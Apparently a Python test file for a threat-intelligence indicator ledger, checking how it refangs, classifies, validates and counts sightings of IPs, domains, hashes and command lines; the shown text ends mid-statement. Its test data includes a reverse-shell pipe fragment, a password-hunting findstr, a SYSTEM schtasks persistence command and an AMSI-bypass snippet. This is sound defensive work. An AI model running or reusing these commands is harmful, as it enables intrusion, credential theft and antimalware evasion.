"""The observables ledger: refang/classify precision, the no-regex-creation
rule, sighting mechanics, and the analyst door."""

import uuid

import pytest

from app.intelligence.observables import (
    Candidate,
    classify_value,
    compute_confidence,
    get_or_create_observable,
    is_defanged,
    kind_for_ttp_observable,
    normalize_value,
    parse_ioc_list_body,
    record_sighting,
    refang,
    scan_candidates,
    sight_known_values,
    status_for,
    store_observables,
    validate_kind_value,
)
from app.models.observable import Observable

# ---------------------------------------------------------------------------
# Refang & classification
# ---------------------------------------------------------------------------


def test_refang_common_notations():
    assert refang("hxxps://evil[.]com/path") == "https://evil.com/path"
    assert refang("evil[.]com") == "evil.com"
    assert refang("1.2.3[.]4") == "1.2.3.4"
    assert refang("bad(dot)example[.]net") == "bad.example.net"
    # Markdown-escaped defanging, as a CMS renders an author's [.]
    assert refang("https://chubrik\\[.\\]sbs/files/x.dll") == "https://chubrik.sbs/files/x.dll"
    assert is_defanged("chubrik\\[.\\]sbs")
    assert is_defanged("evil[.]com")
    assert is_defanged("hxxp://x.com")
    assert not is_defanged("https://example.com")


def test_classify_hashes_by_length():
    assert classify_value("d41d8cd98f00b204e9800998ecf8427e") == ("md5", "d41d8cd98f00b204e9800998ecf8427e")
    assert classify_value("DA39A3EE5E6B4B0D3255BFEF95601890AFD80709")[0] == "sha1"
    assert classify_value("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")[0] == "sha256"


def test_classify_ip_rejects_junk():
    assert classify_value("45.155.204.119") == ("ipv4", "45.155.204.119")
    # v1's regex matched all of these; the octet-validated one must not.
    assert classify_value("999.999.999.999") is None
    assert classify_value("192.168.1.10") is None  # private
    assert classify_value("127.0.0.1") is None  # loopback
    assert classify_value("8.8.8.8") is None  # benign resolver
    assert classify_value("192.0.2.14") is None  # documentation range


def test_classify_domain_rejects_lookalikes():
    assert classify_value("update-checker.net") == ("domain", "update-checker.net")
    # Filenames and version strings regex-match a domain shape.
    assert classify_value("loader.exe") is None
    assert classify_value("config.yaml") is None
    assert classify_value("example.com") is None
    assert classify_value("readme.md") is None


def test_normalize_value_per_kind():
    assert normalize_value("domain", "EVIL[.]COM") == "evil.com"
    assert normalize_value("registry", "HKCU\\Software\\Foo") == "hkcu\\software\\foo"
    assert normalize_value("cmdline", "powershell   -nop\t-enc  AAA") == "powershell -nop -enc AAA"
    assert normalize_value("url", "HTTPS://EVIL.COM/Path/X") == "https://evil.com/Path/X"


def test_validate_kind_value_edges():
    assert validate_kind_value("uri_path", "/webui/logoutconfirm.html?logon_hash=1") is not None
    assert validate_kind_value("uri_path", "webui") is None
    assert validate_kind_value("ja3", "771,4865-4866") is None
    assert validate_kind_value("ja3", "e7d705a3286e19ea42f587b344ee6865") is not None
    # Cert fingerprints normalize colon-separated hex.
    assert validate_kind_value("cert_fingerprint", "AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD") == (
        "aabbccddeeff00112233445566778899aabbccdd"
    )
    assert validate_kind_value("cmdline", "dir") is None  # too short to mean anything
    # cmdline: sentences about commands and OR/AND rule chains are not atoms.
    assert validate_kind_value("cmdline", "disable Microsoft's Antimalware Scan Interface (AMSI)") is None
    assert validate_kind_value("cmdline", "attempts six PHP functions in sequence, downloads a payload") is None
    assert validate_kind_value("cmdline", "* cl * OR *clear-log* OR */Trace*") is None
    assert validate_kind_value("cmdline", 'findstr /s /i /n /c: "password"') is not None
    assert validate_kind_value("cmdline", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i") is not None
    # path: exact atoms only — no wildcards/placeholders, no prose tails,
    # no bare well-known directories.
    assert validate_kind_value("path", "/tmp") is None
    assert validate_kind_value("path", "/ui/") is None
    assert validate_kind_value("path", "/Users/*/Library/LaunchAgents/x.plist") is None
    assert validate_kind_value("path", "/access/api/repositories/<name>") is None
    assert validate_kind_value("path", "C:\\Windows\\System32\\phoneinfo.dll") is not None
    assert validate_kind_value("path", "%APPDATA%\\Microsoft") is not None
    assert validate_kind_value("path", "/tmp/stolen_creds.txt") is not None
    # Spaces are legitimate in Windows paths; prose and enumerations are not.
    assert (
        validate_kind_value("path", "\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\RdrCEF.exe") is not None
    )
    assert validate_kind_value("path", "/api/commits/' URIs containing 'file.path' parameters") is None
    assert validate_kind_value("path", "/opt/zimbra/jetty/webapps/, /opt/zimbra/jetty_base/webapps/") is None
    # user_agent requires product/version syntax at every door.
    assert validate_kind_value("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)") is not None
    assert validate_kind_value("user_agent", "administrator") is None
    assert validate_kind_value("user_agent", "email addresses") is None


# ---------------------------------------------------------------------------
# Candidate scan — precision policy
# ---------------------------------------------------------------------------

ARTICLE = """Qakbot returns with new infrastructure.

Second-stage traffic beacons to 91.92.240.37 over TLS, with fallback via
update-checker[.]net and hxxps://cdn-metrics.top/ldr.php. The loader
(SHA256 e4d1c8a7aa0b2ce3ab21f9dc31d7ac2e90bf4412345678901234567890abcdef)
matches earlier activity. See our writeup at https://example-vendor.com/blog
and Microsoft's advisory at microsoft.com. Internal test host 10.0.0.5
was used for detonation. Version 2.4.1.100 fixed it.
"""


def test_scan_candidates_captures_atoms_and_defanged_only():
    cands = scan_candidates(ARTICLE)
    by_kind_value = {(c.kind, c.value) for c in cands}
    # Always-on: public IP and hash.
    assert ("ipv4", "91.92.240.37") in by_kind_value
    assert any(k == "sha256" for k, _ in by_kind_value)
    # Defanged-only: the defanged domain and URL are in; bare domains are not.
    assert ("domain", "update-checker.net") in by_kind_value
    assert ("url", "https://cdn-metrics.top/ldr.php") in by_kind_value
    assert all(v != "microsoft.com" for _, v in by_kind_value)
    assert all("example-vendor.com" not in v for _, v in by_kind_value)
    # Gates: private IP and version string never nominate.
    assert all(v != "10.0.0.5" for _, v in by_kind_value)
    assert all(not v.startswith("2.4.1") for _, v in by_kind_value)


def test_scan_candidates_marks_defanged_and_paragraph():
    cands = {c.value: c for c in scan_candidates(ARTICLE)}
    assert cands["update-checker.net"].was_defanged is True
    assert cands["91.92.240.37"].was_defanged is False
    assert cands["91.92.240.37"].paragraph_index >= 1


def test_scan_candidates_dedupes_and_caps():
    text = "1.2.3.4 " * 50 + " 45.155.204.119"
    cands = scan_candidates(text, max_candidates=1)
    assert len(cands) == 1


# ---------------------------------------------------------------------------
# ioc_list parsing & TTP mapping
# ---------------------------------------------------------------------------


def test_parse_ioc_list_body():
    body = """# Cobalt Strike C2s
193.149.176.201
45.155.204.119,cobalt strike,2026-09-01
bad-c2-domain.top
// comment line
999.1.1.1
loader.exe
"""
    pairs = parse_ioc_list_body(body)
    assert ("ipv4", "193.149.176.201") in pairs
    assert ("ipv4", "45.155.204.119") in pairs
    assert ("domain", "bad-c2-domain.top") in pairs
    assert all(v != "999.1.1.1" for _, v in pairs)
    assert all(v != "loader.exe" for _, v in pairs)


def test_kind_for_ttp_observable_maps_atoms_not_patterns():
    assert kind_for_ttp_observable("cmdline", "powershell -enc JABzAD0A") == "cmdline"
    assert kind_for_ttp_observable("registry", "HKCU\\Software\\X") == "registry"
    assert kind_for_ttp_observable("client_id", "Mozilla/5.0 (evil)") == "user_agent"
    assert kind_for_ttp_observable("client_id", "curl/8.1.2") == "user_agent"
    # client_id is a grab-bag: account names, service labels, prose and CVE
    # ids are NOT user agents (the screenshot case).
    for junk in (
        "administrator",
        "ScreenConnect",
        "admin tokens",
        "SSH",
        "zimbra",
        "session cookies",
        "CVE-2026-85880",
        "port 502",
        "root@pam",
        "user_1",
    ):
        assert kind_for_ttp_observable("client_id", junk) is None, junk
    assert kind_for_ttp_observable("hash", "d41d8cd98f00b204e9800998ecf8427e") == "md5"
    # Patterns stay on the technique.
    assert kind_for_ttp_observable("domain_pattern", "*.cdn-metrics.top") is None
    assert kind_for_ttp_observable("header", "X-Custom: beacon") is None
    assert kind_for_ttp_observable("other", "whatever") is None
    # Prose descriptions are not artifacts (real values seen in the corpus):
    # a command carries syntax, a path carries a separator, a registry key
    # starts with a hive.
    assert kind_for_ttp_observable("cmdline", "arbitrary operating system commands") is None
    assert kind_for_ttp_observable("cmdline", "Python code") is None
    assert kind_for_ttp_observable("path", "the Startup folder") is None
    assert kind_for_ttp_observable("path", "C:\\Users\\Public\\loader.dll") == "path"
    assert kind_for_ttp_observable("registry", "Run keys") is None
    assert kind_for_ttp_observable("registry", "HKCU\\Software\\Classes\\ms-settings") == "registry"


# ---------------------------------------------------------------------------
# Confidence & lifecycle math
# ---------------------------------------------------------------------------


def test_confidence_decay_half_life():
    from datetime import UTC, datetime, timedelta

    now = datetime.now(UTC)
    # An IP at its 30-day half-life sits at half its base.
    assert compute_confidence(0.8, "ipv4", now - timedelta(days=30), now) == pytest.approx(0.4, abs=0.01)
    # Hashes and host artifacts never decay.
    assert compute_confidence(0.8, "sha256", now - timedelta(days=400), now) == 0.8
    assert compute_confidence(0.8, "cmdline", now - timedelta(days=400), now) == 0.8
    assert status_for(0.8) == "active"
    assert status_for(0.3) == "aging"
    assert status_for(0.05) == "expired"


# ---------------------------------------------------------------------------
# Doors & sightings (DB)
# ---------------------------------------------------------------------------


async def _make_entry(db_session):
    from app.models.entry import Entry
    from app.models.feed import Feed

    feed = Feed(title="t", url=f"https://t.example/{uuid.uuid4()}", feed_type="rss")
    db_session.add(feed)
    await db_session.flush()
    entry = Entry(feed_id=feed.id, guid=str(uuid.uuid4()), title="e", content_text="x")
    db_session.add(entry)
    await db_session.flush()
    return entry


@pytest.mark.asyncio
async def test_sight_known_values_never_creates(db_session):
    """The core rule: a candidate with no ledger row writes nothing."""
    from sqlalchemy import func, select

    entry = await _make_entry(db_session)
    cands = [Candidate("ipv4", "45.155.204.119", "45.155.204.119", False, 0)]
    sighted = await sight_known_values(db_session, entry.id, cands)
    assert sighted == 0
    total = (await db_session.execute(select(func.count()).select_from(Observable))).scalar_one()
    assert total == 0


@pytest.mark.asyncio
async def test_door_create_then_candidate_sights(db_session):
    entry_a = await _make_entry(db_session)
    entry_b = await _make_entry(db_session)
    obs = await get_or_create_observable(
        db_session, "ipv4", "45.155.204.119", via="ai_extraction", entry_id=entry_a.id, role="c2", evidence="s"
    )
    await record_sighting(db_session, entry_a.id, obs, source="ai")
    # A later entry's candidate scan now exact-matches the known value.
    cands = [Candidate("ipv4", "45.155.204.119", "45.155.204[.]119", True, 2)]
    sighted = await sight_known_values(db_session, entry_b.id, cands)
    assert sighted == 1
    await db_session.refresh(obs)
    assert obs.sighting_count == 2
    assert obs.article_count == 2
    assert obs.status == "active"


@pytest.mark.asyncio
async def test_record_sighting_is_idempotent_per_pair(db_session):
    entry = await _make_entry(db_session)
    obs = await get_or_create_observable(db_session, "sha256", "a" * 63 + "b", via="manual")
    assert await record_sighting(db_session, entry.id, obs, source="manual") is True
    assert await record_sighting(db_session, entry.id, obs, source="sighting") is False
    await db_session.refresh(obs)
    assert obs.sighting_count == 1


@pytest.mark.asyncio
async def test_denied_value_blocks_recreation_and_sighting(db_session):
    entry = await _make_entry(db_session)
    obs = await get_or_create_observable(db_session, "domain", "bad-c2-domain.top", via="manual")
    obs.is_denied = True
    await db_session.flush()
    assert await get_or_create_observable(db_session, "domain", "bad-c2-domain.top", via="manual") is None
    cands = [Candidate("domain", "bad-c2-domain.top", "bad-c2-domain.top", True, 0)]
    assert await sight_known_values(db_session, entry.id, cands) == 0


@pytest.mark.asyncio
async def test_store_observables_gates_ai_output(db_session):
    """The AI door still validates: hallucinated/private values never land."""
    from sqlalchemy import select

    entry = await _make_entry(db_session)
    stored = await store_observables(
        db_session,
        entry.id,
        [
            {"kind": "ipv4", "value": "91.92.240[.]37", "role": "c2", "defanged": True, "evidence": "beacons"},
            {"kind": "ipv4", "value": "10.0.0.5", "role": "c2", "defanged": False, "evidence": "internal"},
            {"kind": "domain", "value": "loader.exe", "role": "payload", "defanged": False, "evidence": "x"},
            {"kind": "domain", "value": "update-checker[.]net", "role": "c2", "defanged": True, "evidence": "y"},
        ],
    )
    assert stored == 2
    rows = (await db_session.execute(select(Observable))).scalars().all()
    values = {(o.kind, o.value) for o in rows}
    assert values == {("ipv4", "91.92.240.37"), ("domain", "update-checker.net")}
    ip_row = next(o for o in rows if o.kind == "ipv4")
    assert ip_row.role == "c2"
    # Defanged AI-confirmed indicator gets the bonus on top of the AI base.
    assert ip_row.base_confidence == pytest.approx(0.9)


# ---------------------------------------------------------------------------
# The analyst door (API)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_promote_and_list_endpoints(client, auth_headers, db_session):
    entry = await _make_entry(db_session)
    await db_session.commit()

    resp = await client.post(
        f"/api/entries/{entry.id}/observables/promote",
        json={"kind": "ipv4", "value": "193.149.176.201", "surface_form": "193.149.176[.]201"},
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["kind"] == "ipv4"
    assert body["value"] == "193.149.176.201"
    assert body["created_via"] == "manual"
    assert body["base_confidence"] == 1.0

    resp = await client.post(
        f"/api/entries/{entry.id}/observables/promote",
        json={"kind": "ipv4", "value": "999.1.2.3"},
        headers=auth_headers,
    )
    assert resp.status_code == 422

    listing = await client.get("/api/observables", headers=auth_headers)
    assert listing.status_code == 200
    assert listing.json()["total"] == 1

    entry_view = await client.get(f"/api/entries/{entry.id}/observables", headers=auth_headers)
    assert entry_view.status_code == 200
    payload = entry_view.json()
    assert len(payload["items"]) == 1
    assert payload["items"][0]["link_source"] == "manual"


def test_scan_code_block_candidates_hosts_from_code_only():
    from app.intelligence.observables import scan_code_block_candidates

    html = """
    <p>The actor ran commands, per the report:</p>
    <pre><code>$ schtasks.exe /Create /RU "NT AUTHORITY\\SYSTEM" /TN updater /TR "C:\\tmp\\a.exe"
HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command
/etc/cron.d/backdoor
{"json": "config lines never nominate"}
# comment lines never nominate
arbitrary prose sentence here</code></pre>
    <p>Prose mentioning schtasks.exe elsewhere never nominates.</p>
    """
    cands = scan_code_block_candidates(html)
    kinds = {(c.kind, c.value) for c in cands}
    assert ("cmdline", 'schtasks.exe /Create /RU "NT AUTHORITY\\SYSTEM" /TN updater /TR "C:\\tmp\\a.exe"') in kinds
    assert ("registry", "hkcu\\software\\classes\\ms-settings\\shell\\open\\command") in kinds
    assert ("path", "/etc/cron.d/backdoor") in kinds
    assert all("json" not in v for _, v in kinds)
    assert all("arbitrary prose" not in v for _, v in kinds)
    # No <pre>/<code> HTML -> nothing (prose never nominates host kinds).
    assert scan_code_block_candidates("<p>schtasks.exe /Create /TN x</p>") == []


@pytest.mark.asyncio
async def test_retro_sight_observable(db_session, monkeypatch):
    from app.intelligence import observables as obs_mod

    # An old entry mentions the value; a decoy does not.
    hit = await _make_entry(db_session)
    hit.content_text = "Beacons to 45.155.204.119 over TLS."
    decoy = await _make_entry(db_session)
    decoy.content_text = "Nothing relevant."
    await db_session.flush()

    obs = await get_or_create_observable(db_session, "ipv4", "45.155.204.119", via="manual")

    def fake_search(query, **kwargs):
        assert query == '"45.155.204.119"'
        return {"hits": [{"id": str(hit.id)}, {"id": str(decoy.id)}]}

    monkeypatch.setattr("app.services.meilisearch_client.search_entries", fake_search)
    sighted = await obs_mod.retro_sight_observable(db_session, obs)
    assert sighted == 1
    await db_session.refresh(obs)
    assert obs.sighting_count == 1


def test_ioc_list_path_gate_blocks_non_indicator_files():
    """The v1 relapse vector: feed repos also ship VPN/RMM/unverified
    inventories — 81% of the first dev backfill was exactly that junk."""
    from app.intelligence.observables import ioc_list_path_allowed, ioc_list_path_tag

    assert ioc_list_path_allowed("feeds/IPC2s-90day.csv")
    assert ioc_list_path_allowed("data/Sliver C2 IPs.txt")
    # "filter-abused" names drb-ra's CLEANEST files (abused infra filtered out)
    assert ioc_list_path_allowed("feeds/domainC2s-90day-filter-abused.csv")
    # Truly denied: known-good, unverified, and provenance-less aggregates.
    assert not ioc_list_path_allowed("feeds/unverified/IPC2s-30day.csv")
    assert not ioc_list_path_allowed("data/whitelist.txt")
    assert not ioc_list_path_allowed("data/all.txt")  # the everything-aggregate
    assert ioc_list_path_allowed(None)  # unknown provenance keeps the old behavior
    # Dual-use infrastructure files are ALLOWED but tagged — kept as context,
    # excluded from publishing.
    assert ioc_list_path_tag("vpn/NordVPNIPs.csv") == "vpn"
    assert ioc_list_path_tag("data/CyberGhostVPNIPs.csv") == "vpn"
    assert ioc_list_path_tag("feeds/DomainPortRMM.csv") == "rmm"
    assert ioc_list_path_tag("data/ResidentialProxy.csv") == "proxy"
    assert ioc_list_path_tag("tor/exit-nodes.txt") == "tor"
    assert ioc_list_path_tag("data/KVMs.txt") == "kvm"
    assert ioc_list_path_tag("data/GoPhish IPs.txt") == "phish_sim"
    assert ioc_list_path_tag("data/BurpSuite IPs.txt") == "scanner"
    assert ioc_list_path_tag("data/Sliver C2 IPs.txt") is None
    assert ioc_list_path_tag(None) is None
    # Filename beats directory: a proxy list inside vpn/ is proxy.
    assert ioc_list_path_tag("vpn/ResidentialProxy.csv") == "proxy"
    # "tor" only as a path token — never inside history/director/monitor.
    assert ioc_list_path_tag("tor/exits.csv") == "tor"
    assert ioc_list_path_tag("feeds/tor-exit-nodes.txt") == "tor"
    assert ioc_list_path_tag("feeds/IPC2s-history.csv") is None
    assert ioc_list_path_tag("collector/monitor.txt") is None
    # A tagged file under unverified/ still ingests (tag quarantines it);
    # the door test below covers the untagged-unverified deny.
    assert ioc_list_path_tag("feeds/unverified/IPRMM.csv") == "rmm"


@pytest.mark.asyncio
async def test_ioc_list_door_refuses_denied_paths(db_session):
    from sqlalchemy import func, select

    from app.intelligence.observables import store_ioc_list_observables

    entry = await _make_entry(db_session)
    stored = await store_ioc_list_observables(
        db_session, entry.id, "45.155.204.119\n193.149.176.201\n", file_path="data/unverified/all.txt"
    )
    assert stored == 0
    total = (await db_session.execute(select(func.count()).select_from(Observable))).scalar_one()
    assert total == 0


def test_candidate_version_range_ips_never_nominate():
    """The screenshot case: 'snappy-java through 1.1.10.8' is a version, and
    '1.2.3.4 and earlier' is a range — neither is infrastructure."""
    text = (
        "CVE-2026-93452: snappy-java through 1.1.10.8 contains a flaw. "
        "Affected releases 2.4.1.100 and earlier should upgrade to 2.4.2.5 immediately. "
        "The implant beacons to 45.155.204.119 for tasking."
    )
    values = {c.value for c in scan_candidates(text)}
    assert "45.155.204.119" in values
    assert "1.1.10.8" not in values
    assert "2.4.1.100" not in values
    assert "2.4.2.5" not in values


def test_candidate_checksum_and_url_hashes_never_nominate():
    """RHSA package digests, git commits and tracking-URL hashes are hex, not
    indicators. A prose malware hash still nominates."""
    text = (
        "Update packages: perl-Net-DNS-1.36-1.el9.rpm sha256sum "
        "57e4c2a507a57e33312e8d1a9d6a3729def850d99a45aaaabbbbccccdddd0000 verified.\n"
        "See https://example.blog/avatar?md5=204a59b01f4443cd96718796fd102c00 for the author.\n"
        "The dropper's hash d876a80fd193793e4edea8da10039db6d66c05e7e786aaaabbbbccccdddd1111 "
        "was submitted to VirusTotal."
    )
    values = {c.value for c in scan_candidates(text)}
    assert "d876a80fd193793e4edea8da10039db6d66c05e7e786aaaabbbbccccdddd1111" in values
    assert "57e4c2a507a57e33312e8d1a9d6a3729def850d99a45aaaabbbbccccdddd0000" not in values
    assert "204a59b01f4443cd96718796fd102c00" not in values


@pytest.mark.asyncio
async def test_ai_shadow_mode_stages_candidates_not_rows(db_session):
    """Default posture: the AI door's confirmations are promotable candidates,
    not ledger rows, until observables_ai_capture_mode is flipped to capture."""
    from sqlalchemy import func, select

    from app.intelligence.observables import shadow_observables

    entry = await _make_entry(db_session)
    staged = await shadow_observables(
        db_session,
        entry.id,
        [
            {"kind": "ipv4", "value": "91.92.240[.]37", "role": "c2", "defanged": True, "evidence": "x"},
            {"kind": "domain", "value": "loader.exe", "role": "payload", "defanged": False, "evidence": "y"},
        ],
        [
            {
                "language": "ps1",
                "label": "AMSI bypass",
                "code": "$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');" * 2,
            }
        ],
    )
    assert staged == 2  # invalid domain rejected; ioc + script staged
    total = (await db_session.execute(select(func.count()).select_from(Observable))).scalar_one()
    assert total == 0
    await db_session.refresh(entry)
    kinds = {(c["kind"], c["value"]) for c in entry.observable_candidates}
    assert ("ipv4", "91.92.240.37") in kinds
    assert any(k == "script" for k, _ in kinds)


@pytest.mark.asyncio
async def test_door_upgrades_passive_sighting_provenance(db_session):
    """A judgment door landing after a passive sighting upgrades the pair's
    source instead of being frozen out (the coalesce bug)."""
    from sqlalchemy import select

    from app.models.observable import EntryObservable

    entry = await _make_entry(db_session)
    obs = await get_or_create_observable(db_session, "ipv4", "45.155.204.119", via="ioc_list")
    assert await record_sighting(db_session, entry.id, obs, source="sighting") is True
    assert await record_sighting(db_session, entry.id, obs, source="ai", confidence="high") is False
    link = (
        await db_session.execute(
            select(EntryObservable).where(EntryObservable.entry_id == entry.id, EntryObservable.observable_id == obs.id)
        )
    ).scalar_one()
    assert link.source == "ai"
    assert link.confidence == "high"
    await db_session.refresh(obs)
    assert obs.sighting_count == 1  # upgrade is not a second sighting


@pytest.mark.asyncio
async def test_backdated_sighting_never_freshens_the_row(db_session):
    """Retro-sighting a 2023 article must not reset decay or freshness —
    otherwise expired infrastructure re-enters the published EDL."""
    from datetime import UTC, datetime, timedelta

    entry = await _make_entry(db_session)
    entry_b = await _make_entry(db_session)
    obs = await get_or_create_observable(db_session, "ipv4", "45.155.204.119", via="manual")
    obs.current_confidence = 0.2
    obs.status = "aging"
    await db_session.flush()

    ancient = datetime.now(UTC) - timedelta(days=400)
    assert await record_sighting(db_session, entry.id, obs, source="sighting", seen_at=ancient) is True
    await db_session.refresh(obs)
    assert obs.sighting_count == 1
    assert obs.current_confidence == 0.2  # no reset from the past
    assert obs.status == "aging"
    # The FIRST sighting owns the clock: the creation-time column default is
    # not a sighting, and keeping it would stamp a backfilled row fresh.
    assert abs((obs.last_seen_at - ancient).total_seconds()) < 5
    assert abs((obs.first_seen_at - ancient).total_seconds()) < 5

    # From the second sighting on, the clock only moves forward.
    older = ancient - timedelta(days=30)
    assert await record_sighting(db_session, entry_b.id, obs, source="sighting", seen_at=older) is True
    await db_session.refresh(obs)
    assert abs((obs.last_seen_at - ancient).total_seconds()) < 5  # unchanged
    assert abs((obs.first_seen_at - older).total_seconds()) < 5  # first_seen reaches back


def test_parse_ioc_list_keeps_url_lines():
    """`//` inside https:// is not a comment marker."""
    pairs = parse_ioc_list_body("https://bad-c2-domain.top/gate.php\nhxxps://evil-cdn.top/x // trailing comment\n")
    values = {v for _, v in pairs}
    assert "https://bad-c2-domain.top/gate.php" in values
    assert "https://evil-cdn.top/x" in values


@pytest.mark.asyncio
async def test_feed_door_tags_dual_use_infrastructure(db_session):
    """A VPN-exit file ingests (context is worth keeping) but every row it
    creates carries the infra tag; a later real-indicator door never clears
    it, and the publish policy must exclude it."""
    from sqlalchemy import select

    from app.intelligence.observables import store_ioc_list_observables

    entry = await _make_entry(db_session)
    stored = await store_ioc_list_observables(db_session, entry.id, "45.155.204.119\n", file_path="data/NordVPNIPs.csv")
    assert stored == 1
    obs = (await db_session.execute(select(Observable))).scalar_one()
    assert obs.infra_tag == "vpn"

    # The AI door later confirms the same IP as C2: role fills in, the vpn
    # tag stays — the dual signal is the point.
    again = await get_or_create_observable(db_session, "ipv4", "45.155.204.119", via="ai_extraction", role="c2")
    assert again is not None and again.id == obs.id
    assert again.infra_tag == "vpn"
    assert again.role == "c2"

    # And a clean-file ingest never invents a tag.
    entry2 = await _make_entry(db_session)
    await store_ioc_list_observables(db_session, entry2.id, "91.92.240.37\n", file_path="feeds/IPC2s.csv")
    clean = (await db_session.execute(select(Observable).where(Observable.value == "91.92.240.37"))).scalar_one()
    assert clean.infra_tag is None


# ---------------------------------------------------------------------------
# Sighting probes, bulk feed door, candidate dismiss
# ---------------------------------------------------------------------------


def test_scan_sighting_probes_cover_fanged_mentions():
    """Probes nominate domains/URLs/emails the author did NOT defang — they
    exist only for exact-match sighting, never for the candidate list."""
    from app.intelligence.observables import scan_sighting_probes

    text = "The malware beacons to update-checker.net and pulls https://cdn-metrics.top/ldr.php for ops@evil.top."
    probes = {(p.kind, p.value) for p in scan_sighting_probes(text)}
    assert ("domain", "update-checker.net") in probes
    assert ("url", "https://cdn-metrics.top/ldr.php") in probes
    assert ("email", "ops@evil.top") in probes
    # And the candidate scan still refuses the same fanged domain.
    assert not any(c.kind == "domain" for c in scan_candidates(text))


@pytest.mark.asyncio
async def test_fanged_mention_sights_known_value(db_session):
    """A known C2 domain printed plainly in a later article still counts."""
    from app.intelligence.observables import scan_sighting_probes

    entry_a = await _make_entry(db_session)
    entry_b = await _make_entry(db_session)
    obs = await get_or_create_observable(
        db_session, "domain", "update-checker.net", via="ai_extraction", entry_id=entry_a.id, role="c2", evidence="s"
    )
    await record_sighting(db_session, entry_a.id, obs, source="ai")
    probes = scan_sighting_probes("Fallback resolution via update-checker.net on port 8443.")
    assert await sight_known_values(db_session, entry_b.id, probes) == 1
    await db_session.refresh(obs)
    assert obs.sighting_count == 2


def test_validate_url_allows_parens():
    """Payload URLs carry parentheses; the validator must not drop them."""
    assert validate_kind_value("url", "https://evil.com/path(1).exe") == "https://evil.com/path(1).exe"
    assert classify_value("https://evil.com/a(1).zip") == ("url", "https://evil.com/a(1).zip")


@pytest.mark.asyncio
async def test_ioc_list_bulk_counters_and_idempotency(db_session):
    """The bulk feed door keeps record_sighting's semantics: one sighting per
    (entry, value), counters incremented once, re-ingest is a no-op."""
    from sqlalchemy import select

    from app.intelligence.observables import store_ioc_list_observables
    from app.models.observable import EntryObservable

    entry = await _make_entry(db_session)
    body = "45.155.204.119\nbad-c2-domain.top\n45.155.204.119\n"
    assert await store_ioc_list_observables(db_session, entry.id, body, file_path="feeds/IPC2s.csv") == 2
    rows = (await db_session.execute(select(Observable).order_by(Observable.kind))).scalars().all()
    assert {(o.kind, o.value) for o in rows} == {("ipv4", "45.155.204.119"), ("domain", "bad-c2-domain.top")}
    assert all(o.sighting_count == 1 and o.article_count == 1 and o.created_via == "ioc_list" for o in rows)
    links = (await db_session.execute(select(EntryObservable))).scalars().all()
    assert all(link.source == "feed" and link.surface_form for link in links)

    # Re-ingest of the same body: no new sightings, no double-counting.
    assert await store_ioc_list_observables(db_session, entry.id, body, file_path="feeds/IPC2s.csv") == 2
    for o in (await db_session.execute(select(Observable))).scalars():
        assert o.sighting_count == 1


@pytest.mark.asyncio
async def test_ioc_list_bulk_backdated_seen_at_never_freshens(db_session):
    """A historical backfill (old published_at) must not reset decay clocks."""
    from datetime import UTC, datetime, timedelta

    from sqlalchemy import select

    from app.intelligence.observables import store_ioc_list_observables

    entry = await _make_entry(db_session)
    old = datetime.now(UTC) - timedelta(days=200)
    await store_ioc_list_observables(db_session, entry.id, "45.155.204.119\n", file_path="feeds/IPC2s.csv", seen_at=old)
    obs = (await db_session.execute(select(Observable))).scalar_one()
    assert abs((obs.last_seen_at - old).total_seconds()) < 5


@pytest.mark.asyncio
async def test_ioc_list_bulk_upgrades_passive_sighting(db_session):
    """A passive sighting that predates the feed ingest upgrades to feed provenance."""
    from sqlalchemy import select

    from app.intelligence.observables import store_ioc_list_observables
    from app.models.observable import EntryObservable

    entry = await _make_entry(db_session)
    obs = await get_or_create_observable(db_session, "ipv4", "45.155.204.119", via="manual")
    await record_sighting(db_session, entry.id, obs, source="sighting")
    await store_ioc_list_observables(db_session, entry.id, "45.155.204.119\n", file_path="feeds/IPC2s.csv")
    link = (await db_session.execute(select(EntryObservable))).scalar_one()
    assert link.source == "feed"
    await db_session.refresh(obs)
    assert obs.sighting_count == 1  # the pair existed; no double count


@pytest.mark.asyncio
async def test_dismiss_candidate_is_entry_local(client, auth_headers, db_session):
    entry = await _make_entry(db_session)
    entry.observable_candidates = [
        {"kind": "domain", "value": "learn.microsoft.com", "surface_form": "learn.microsoft.com", "origin": "scan"},
        {"kind": "ipv4", "value": "45.13.7.2", "surface_form": "45.13.7.2", "origin": "scan"},
    ]
    await db_session.commit()

    resp = await client.post(
        f"/api/entries/{entry.id}/observables/dismiss",
        json={"kind": "domain", "value": "learn.microsoft.com"},
        headers=auth_headers,
    )
    assert resp.status_code == 204, resp.text
    view = (await client.get(f"/api/entries/{entry.id}/observables", headers=auth_headers)).json()
    assert [c["value"] for c in view["candidates"]] == ["45.13.7.2"]
    # Entry-local only: nothing was tombstoned in the ledger.
    from sqlalchemy import func, select

    assert (await db_session.execute(select(func.count()).select_from(Observable))).scalar_one() == 0

    again = await client.post(
        f"/api/entries/{entry.id}/observables/dismiss",
        json={"kind": "domain", "value": "learn.microsoft.com"},
        headers=auth_headers,
    )
    assert again.status_code == 404


@pytest.mark.asyncio
async def test_reconcile_observable_counters(db_session):
    """Cascaded entry deletion drifts the increment-only counters; the nightly
    recount restores ground truth."""
    from sqlalchemy import delete as sql_delete
    from sqlalchemy import func, or_, select, update

    from app.models.observable import EntryObservable

    entry_a = await _make_entry(db_session)
    entry_b = await _make_entry(db_session)
    obs = await get_or_create_observable(db_session, "ipv4", "45.155.204.119", via="manual")
    await record_sighting(db_session, entry_a.id, obs, source="manual")
    await record_sighting(db_session, entry_b.id, obs, source="sighting")
    # Simulate retention cleanup: the junction rows cascade, counters don't.
    await db_session.execute(sql_delete(EntryObservable).where(EntryObservable.entry_id == entry_b.id))
    await db_session.flush()

    # The same UPDATE..FROM the reconcile job runs (its worker session can't
    # point at the test DB, so the statement is exercised directly).
    counts = (
        select(EntryObservable.observable_id, func.count().label("cnt"))
        .group_by(EntryObservable.observable_id)
        .subquery()
    )
    await db_session.execute(
        update(Observable)
        .where(
            Observable.id == counts.c.observable_id,
            or_(
